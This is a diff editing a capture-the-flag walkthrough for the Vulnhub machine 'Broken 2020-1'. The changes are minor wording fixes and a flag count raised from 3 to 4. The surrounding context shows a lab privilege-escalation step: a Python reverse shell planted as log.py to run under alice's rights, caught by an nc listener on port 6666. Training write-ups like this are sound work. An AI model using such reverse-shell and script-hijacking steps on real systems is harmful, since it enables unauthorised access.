@@ -4,7 +4,7 @@
 
 This virtual machine is released on April 22, 2020 by [EuSecuinfo](http://secuinfo.eu/) at Vulnhub.  The goal is to get the user and root flags.  However, there is no public exploitation to be used for the vulnerability.  The author suggests to use custom exploitation instead.
 
-There are a total of 3 flags to be got.
+There are a total of 4 flags to be got.
  
 Available on : [Vulnhub](https://www.vulnhub.com/entry/broken-2020-1,470/)  
 Difficulty : Beginner for user flag and intermediate for root flag.  
@@ -373,7 +373,7 @@ www-data@broken:/back/backup$
 
 After seeing this note, that mean there is something to do further.  The FLAG3 may not be the last flag.  Planning to put a directory to the ```path.txt```.  It is going to put ```/root``` to the ```path.txt```.
 
-However, we need to be ```alice``` rights to do so.  However, we are at ```www-data``` rights at the moment.  After studying the scripts, it is confirmed that ```log.py``` will run in ```alice``` rights.
+We need to be ```alice``` rights to do so.  However, we are at ```www-data``` rights at the moment.  After studying the scripts, it is confirmed that ```log.py``` will run in ```alice``` rights.
 
 At Kali box, create a ```log.py``` with the following reverse shell.
 
@@ -393,7 +393,7 @@ p=subprocess.call(["/usr/bin/bash","-i"])
 nc -lvp 6666
 ```
 
-At Broken box at ```/home/alice/script```, do the following and wait for a minute.  A reverse shell is launched at port 6666.
+At Broken box at ```/home/alice/script```, do the following and wait for a minute.  A reverse shell is ported at port 6666.
 
 ```bash
 cd /home/alice/script
